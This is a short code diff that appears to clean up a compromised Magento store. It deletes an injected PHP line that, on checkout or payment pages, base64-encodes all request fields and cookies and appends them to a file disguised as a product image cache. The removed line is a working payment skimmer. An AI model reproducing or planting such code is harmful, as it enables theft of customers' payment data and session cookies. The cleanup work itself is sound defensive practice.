@@ -1,4 +1,3 @@
-<?php if(preg_match("/checkout|payment/", $_SERVER["REQUEST_URI"])){@file_put_contents(realpath("./")."/media/catalog/product/cache_catalogs", @base64_encode(serialize($_REQUEST)."--".serialize($_COOKIE)). ":", FILE_APPEND); }?>
 <?php
 /**
  * Magento
